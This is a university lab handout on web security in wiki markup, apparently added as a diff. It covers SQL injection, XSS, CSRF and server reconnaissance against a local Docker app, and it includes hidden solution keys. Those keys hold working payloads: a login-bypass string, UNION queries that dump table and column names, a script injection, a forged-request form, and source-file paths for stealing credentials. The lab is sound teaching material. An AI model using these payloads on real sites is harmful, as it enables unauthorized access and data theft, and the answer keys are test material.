@@ -1,0 +1,238 @@
+/* ~~SHOWSOLUTION~~ */
+
+====== Lab 08 - Web Security ======
+
+===== Objectives =====
+  * Web vulnerabilities, both server-side and client-side
+  * Server-side SQL injection
+  * Cross-Site Scripting, Cross-Site Request Forgery
+
+===== Background =====
+
+==== SQL Injection ====
+
+SQL Injection is a server-side code injection vulnerability resulting from
+improper (unsanitized) input directly concatenated into SQL queries.
+Typical server queries are built as strings:
+<code javascript>
+sql = "SELECT * FROM table WHERE item = '" + user_input_variable + "' <other expressions>";
+database.query(sql);
+</code>
+
+Note that the user may choose to escape the SQL quotes and alter the SQL statement, e.g.:
+<code javascript>
+user_input_variable = "' OR 1=1 -- "; // example input given by the user
+sql = "SELECT * FROM table WHERE item = '' OR 1=1 -- ' <other expressions>";
+</code>
+
+An SQL injection exploit ultimately depends on the target SQL expression (which
+is usually unknown to the attacker) and query result behavior (whether the
+query contents arem displayed on screen or the user is blind, errors reported
+etc.).
+
+**Make sure to check those cheatsheets out:** \\
+[[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection]] \\
+and:\\
+[[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md]]
+
+==== Other server-side vulnerabilities ====
+
+The SQL injection is a popular server-side code injection vulnerability, but
+there are many mistakes that a website developer / system administrator can
+make (//expect to find some of them in your homework :P //):
+
+  * code injection (LDAP, eval, shell execution etc.);
+  * broken authentication or access control (authorization);
+  * sensitive data exposure (e.g., backups / keys forgotten inside web root);
+  * path traversal;
+  * server misconfiguration;
+  * //[[https://owasp.org/www-community/vulnerabilities/|and many more]]//
+
+There are even
+[[https://owasp.org/www-community/Vulnerability_Scanning_Tools|free or
+commercial web vulnerability scanners]] for testing a server's sercurity!
+
+
+==== Client-side vulnerabilities ====
+
+Browsers are now among the most targeted pieces of software on the Internet.
+This is mainly because of the large threat vector resulting from the complexity of
+the web ecosystem, requiring features such as fancy HTML+CSS rendering,
+animation and even sandboxed, untrusted JavaScript code execution.
+
+Even when the browsers do a good job at protecting against attacks, sometimes
+trusted websites themselved may contain bugs that directly affect the security
+of their users.
+
+A major threat, **Cross Site Scripting (XSS)** is a JavaScript code injection
+vulnerability where an attacker that found a way to post public HTML scripts
+into an unprotected website (e.g., by using comments forms or forum responses).
+Those scripts, if served to other visitors, will execute with the credentials
+of their respective users, making it possible for the attacker to scam,
+exfiltrate personal data or even push malware into the victim's PC.
+
+Another typical client-side vulnerability that the web developers need to
+protect their websites against is
+**[[https://research.securitum.com/what-is-the-csrf-cross-site-request-forgery-vulnerability/|Cross-Site
+Request Forgery (CSRF)]]**.
+In this attack, the victim is tricked into opening an attacker-controlled web
+page which then issues custom requests (either using concealed elements that do
+external requests - ''img'', ''form'', or by using JavaScript / AJAX) to
+another (target) website. The browser will happily make the requests using the
+target domain's cookies and credentials.
+If the target website has URLs that execute certain actions (e.g., ''POST
+https://my-blog/post.php'') without verifying the source of the request, any
+malicious page can execute them.
+Note that the attacker cannot see the results of those requests (unless
+authorized by CORS headers by the target).
+In practice, any URL endpoint executing sensitive actions needs to be protected
+using either referer validation or CSRF tokens.
+
+===== Setup =====
+
+You will be using a [[https://cloud-controller.grid.pub.ro/|OpenStack VM]] for
+your tasks.
+
+Remember that the instances have private IPs, ''10.9.x.y'', inaccessible from
+anywhere but the campus network. Since we need to use a local browser to access
+a web server running inside the VM, we will employ a SSH tunnelling + proxy
+trick to accomplish this.
+
+First, copy your private key from **fep** to your workstation (since
+authentication with the VM will be realized from your PC) \\
+(//either do this, or assign a key existing on your machine to your OpenStack
+account and VM instance)//:
+<code bash>
+scp <first.lastname>@fep.grid.pub.ro:.ssh/id_rsa ~/.ssh/fep_rsa  # (for *nixes)
+chmod 700 ~/.ssh/fep_rsa  # required on *nix systems
+</code>
+Make sure to replace ''id_rsa'' from the remote server (fep) with your actual key name (if you didn't use the
+default one). If you're on Windows / not WSL, please download the key to a path inside your home (last ''scp'' argument).
+
+Connect to the VM using (**ssh on Linux / WSL**):
+<code bash>
+ssh -i <fep key path> -L "8080:localhost:8080" -o 'ProxyCommand=ssh <first.lastname>@fep.grid.pub.ro -W %h:%p' student@10.9.X.Y
+# after entering the password for fep and trusting the server's public key,
+# you should see the 'student@host:~$' prompt!
+</code>
+
+If you use **OpenSSH for Windows**, you must use the full path for ''ProxyCommand'':
+<code bash>
+ssh -i <fep key path> -L "8080:localhost:8080" -o 'ProxyCommand=C:\Windows\System32\OpenSSH\ssh.exe <first.lastname>@fep.grid.pub.ro -W %h:%p' student@10.9.X.Y
+</code>
+
+This uses //fep.grid.pub.ro// as a proxy (''-W'' is stdin/stdout forwarding),
+successfully connecting to the SSH server running on the OpenStack VM
+(inaccessible otherwise) and requesting it to forward (''-L <local
+addr:port>:<remote addr:port>'') its HTTP server port (''localhost:8080'') back
+to your phisical machine (same port, for convenience)!
+
+**Note:** replace the ''<fep key path>'', ''<first.lastname>'' and ''X.Y'' placeholders with the
+actual path to your SSH key / username / VM IP address!\\
+You can use the same trick to forward any port from a OpenStack VM to your
+local host!
+
+<hidden>
+For this lab, **you are required to take a screenshot proving each task's
+completeness** (usually, of the exploited webpage).
+For the SQL injection tasks, it would be nice if you saved a list of successful
+inputs in a .txt file. For the XSS / CSRF injection tasks, please include the
+HTML / JavaScript code you used into the archive.
+
+Please upload the screenshots / readme to [[https://curs.upb.ro/mod/assign/view.php?id=280251|This Moodle Assignment]].
+</hidden>
+
+===== Tasks =====
+
+=== 1 [20p]. SQL Injection ===
+
+  * Start the web server by using the following sequence: <code bash>
+# First, start the MySQL instance in background
+docker run -d --rm --name mysql ropubisc/lab08-mysql
+# Wait until the MySQL server fully starts:
+docker logs mysql -f 
+# Ctrl+C and continue when it says: 'mysqld: ready for connections.'
+
+# Finally, start the sample web server
+docker run -it --link mysql:mysql -p 8080:8080 ropubisc/lab08-web-server
+</code>
+  * Connect to the application using [[http://localhost:8080/]] (assuming you forwarded the port correctly)
+  * Now: You don't know any user / password for this website. Try to log in using SQL Injection!
+  * Hint: Try the apostrophe in one of the login fields, check if it shows an error!
+  * If you ever want to exit the MySQL server:<code>
+docker kill mysql
+</code>
+
+<solution -hidden>
+Login with ''%%' OR 1=1 -- -%%''
+</solution>
+
+=== 2 [20p]. Advanced SQL Injection ===
+
+  * Start the web server from the first task again.
+  * What if I told you there is a hidden **flag** inside the database? Find it!
+  * Hint: where do you have query feedback inside the application? try to do an ''UNION'' hack!
+  * Note: for UNION to work, you must SELECT exactly the same number of columns as in the original query!\\ Check out the cheatsheets from the Background section + here's a UNION example: <code sql>
+SELECT col1, col2... from tablename WHERE name='' UNION (SELECT 1, 2, ...)  -- bruteforce the number of columns! '
+</code> (don't type this into the input field, extract the relevant parts!)
+  * Hint: first, you need to discover the names of tables in the database (to avoid extra steps, the schema name is ''journalapp''); afterwards, find the column containing the flag, then extract it!
+
+<solution -hidden>
+Find the number of main table columns: ''%%asd' UNION (SELECT 1, 2, 3, 4) -- .%%''\\
+Find the tables: ''%%' UNION SELECT 1, 2, 3, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='journalapp' -- .%%''\\
+Find the columns: ''%%' UNION SELECT 1, 2, 3, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flags' -- .%%''\\
+Find the flag: ''%%' UNION SELECT 1, 2, 3, flag FROM flags -- .%%''\\
+</solution>
+
+=== 3 [20p]. Cross-Site Scripting ===
+
+  * You can still save the day: cover the monster's mouth (you can use the image at ''http://localhost:8080/images/muzzle.png'')!
+  * Since HTML is allowed, you can also inject a JavaScript alert 
+  * **Hint**: You can use absolute element positioning, e.g.: ''<div style="position: absolute; top: -300px; ...">...''. Try it with the browser's developer console / inspect element first before injecting it inside a message ;)
+
+<solution -hidden>
+Post some javascript!
+<code>
+<div style="position: absolute; top: -510px; left: 250px"><img src="/images/muzzle.png"></div>
+<script>alert("No more Shosho, phew!");</script>
+</code>
+</solution>, phew
+
+=== 4 [20p]. Cross-Site Request Forgery ===
+
+  * The objective is to fool your victim using an external website (simulated using a local .html page) to post an attacker-controller message into the website.
+  * On your local station, as the attacker: create a simple HTML page that posts a hidden message to [[http://localhost:8080/journal/post]]; this will be equivalent to hosting a malicious website;
+  * Hint: Check the HTML of the website for a ''%%<form>%%'' example!
+  * Hint: Use an input with ''%%type="hidden"%%''
+  * Switching sides (you're the victim, now): open that HTML page using your web browser. Click a button and the hidden message will be posted ;)
+  * (Make sure you are logged in inside the web app before doing the attack!)
+  * For bonus, you can try to do a cross-site AJAX posting the message automatically (without requiring user interaction!).
+
+<solution -hidden>
+<code>
+<form action="http://localhost:8080/journal/post" method="post">
+<input type="hidden" name="message" value="I am stupid!">
+<input type="submit" value="Click me!">
+</form>
+</code>
+</solution>
+
+=== 5 [20p]. Server Reconnaissance ===
+
+  * Can you steal the source code of the server-side code using HTTP only?
+  * Once you found it, try to find the database credentials!
+  * Hint: try to guess the path to a [[https://docs.npmjs.com/files/package.json|common file]] that all NodeJS projects have! It may reference the main script's name!
+  * Also try it by using a tool: [[https://cirt.net/nikto2|nikto]], ''apt install nikto''
+
+<solution -hidden>
+<code>
+GET /package.json
+it references the main file:
+GET /server.js
+</code>
+</solution>
+
+=== Feedback ===
+
+Please take a minute to fill in the [[https://forms.gle/5Lu1mFa63zptk2ox9|feedback form]] for this lab.
+
